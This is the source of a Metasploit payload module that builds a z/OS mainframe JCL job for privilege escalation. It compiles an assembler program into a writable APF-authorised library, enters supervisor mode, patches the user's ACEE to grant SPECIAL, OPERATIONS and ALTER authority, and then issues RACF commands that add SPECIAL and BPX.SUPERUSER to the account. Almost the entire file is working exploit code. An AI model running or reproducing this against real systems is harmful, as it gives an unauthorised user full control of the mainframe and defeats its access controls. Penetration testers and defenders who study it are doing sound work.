##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This is a JCL command payload for z/OS - mainframe.
#   It will escalate privileges of an account on the system if the user
#   can identify a writable APF authorised library "APFLIB"
#
#   See https://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.zsecurity/zsecc_060.htm
#   for more information on APF Authorized Libraries
#
#   Thank you to Ayoub & The Brummie for the assembler ideas.
#
#   To-do (BeS 4/11/17)
#     Add options for privileges that can be added.
#     Auto scan for writable APF authorized library.
##

require 'msf/core/handler/find_shell'
require 'msf/base/sessions/mainframe_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule
  CachedSize = 3000
  include Msf::Payload::Single
  include Msf::Payload::Mainframe

  def initialize(info = {})
    super(merge_info(
      info,
      'Name'          => 'JCL to Escalate Privileges',
      'Description'   => %q{(Elevate privileges for user. Adds
         SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using
         an unsecured/updateable APF authorized library (APFLIB) and updating
         the user's ACEE using this program/library.  Note: This privesc only
         works with z/OS systems using RACF, no other ESM is supported.)},
      'Author'        =>
        [
          'Bigendian Smalls',
          'Ayoub'
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'mainframe',
      'Arch'           => ARCH_CMD,
      'Handler'        => Msf::Handler::None,
      'Session'        => Msf::Sessions::MainframeShell,
      'PayloadType'    => 'cmd',
      'RequiredCmd'    => 'jcl',
      'Payload'        =>
      {
        'Offsets' => {},
        'Payload' => ''
      }
    ))
    register_options(
      [
        Opt::RPORT(21),
        OptString.new('ACTNUM', [true, "Accounting info for JCL JOB card", "MSFUSER-ACCTING-INFO"]),
        OptString.new('PGMNAME', [true, "Programmer name for JCL JOB card", "programmer name"]),
        OptString.new('JCLASS', [true, "Job Class for JCL JOB card", "A"]),
        OptString.new('NOTIFY', [false, "Notify User for JCL JOB card", ""]),
        OptString.new('MSGCLASS', [true, "Message Class for JCL JOB card", "Z"]),
        OptString.new('MSGLEVEL', [true, "Message Level for JCL JOB card", "(0,0)"]),
        OptString.new('APFLIB', [true, "APF Authorized Library to use", "SYS1.LINKLIB"])
      ],
      self.class
    )
    register_advanced_options(
      [
        OptBool.new('NTFYUSR', [true, "Include NOTIFY Parm?", false]),
        OptString.new('JOBNAME', [true, "Job name for JCL JOB card", "DUMMY"])
      ],
      self.class
    )
  end

  ##
  # Construct Payload
  ##
  def generate
    super + command_string
  end

  ##
  # Setup replacement vars from options if need be
  ##
  def command_string
    jcl_jobcard +
      "//S1        EXEC ASMACLG,PARM.L='AC(1)'\n" \
      "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR\n" \
      "//          DD DSN=SYS1.MACLIB,DISP=SHR\n" \
      "//L.SYSLMOD DD DISP=SHR,DSN=#{datastore['APFLIB']}(APFPRIV)\n" \
      "//C.SYSIN   DD *,DLM=ZZ\n" \
      "         TITLE  'APF MISCONFIG PRIVESC FOR MSF'\n" \
      "APFPRIV  CSECT\n" \
      "***********************************************************************\n" \
      "*         SETUP registers and save areas                              *\n" \
      "***********************************************************************\n" \
      "MAIN     STM   14,12,12(13)    # Save caller reg\n" \
      "         LR    8,15            # Base register\n" \
      "         USING MAIN,8          # R8 for addressability\n" \
      "         GETMAIN RU,LV=72      # for our savearea\n" \
      "         ST    13,4(,1)        # Store Caller's SA address\n" \
      "         ST    1,8(,13)        # Put my SA addr in caller's SA\n" \
      "         LR    13,1            # R13 has addr of our SA\n" \
      "         DS    0H              # halfword boundaries\n" \
      "***********************************************************************\n" \
      "* MAIN PROGRAM STMTS HERE                                             *\n" \
      "***********************************************************************\n" \
      "         BAL   6,AUTHUSR       # branch authuser routine\n" \
      "         B     EXITP           # exit time\n" \
      "***********************************************************************\n" \
      "* AUTHUSER ROUTINE                                                    *\n" \
      "***********************************************************************\n" \
      "AUTHUSR  MODESET KEY=ZERO,MODE=SUP  # let's get into supervisor mode!\n" \
      "         L     11,X'224'       # R11 points to ASCB\n" \
      "         L     11,X'6C'(11)    # R11 points to ASXB\n" \
      "         L     11,X'C8'(11)    # R11 points to ACEE\n" \
      "         NI    X'26'(11),X'00' # Clear Byte x'26'\n" \
      "         OI    X'26'(11),X'B1' # Add Oper & Special to userproc\n" \
      "         NI    X'27'(11),X'00' # Clear Byte x'27\n" \
      "         OI    X'27'(11),X'80' # ALTER access to all resource\n" \
      "         MODESET KEY=NZERO,MODE=PROB # back to normal\n" \
      "         XR    15,15           # set rc=0 regardless\n" \
      "         BR    6               # R6 has return reg\n" \
      "***********************************************************************\n" \
      "*        Cleanup and exit - R15 has exit code                         *\n" \
      "***********************************************************************\n" \
      "EXITP    LR    1,13            # Move my SA into R1\n" \
      "         LR    2,15            # SAVE RC\n" \
      "         L     13,4(,13)       # RST Caller SA Addr\n" \
      "         L     14,12(13)       # Reload R14\n" \
      "         FREEMAIN RU,A=(1),LV=72\n" \
      "         LR    15,2            # RESTORE RC\n" \
      "         LM    0,12,20(13)     # Reload all but 14/15\n" \
      "         BCR   15,14           # Branch back to caller\n" \
      "         END   APFPRIV            # end pgm\n" \
      "ZZ\n" \
      "//S2        EXEC PGM=IKJEFT01\n" \
      "//SYSTSIN   DD *\n" \
      " ALU #{datastore['FTPUSER']} SPECIAL\n" \
      " PE BPX.SUPERUSER CLASS(FACILITY) ID(#{datastore['FTPUSER']}) ACCESS(READ)\n" \
      " SETR RACL(FACILITY) REF\n" \
      "/*\n" \
      "//SYSIN     DD DUMMY\n" \
      "//SYSTSPRT  DD SYSOUT=*\n"
  end
end
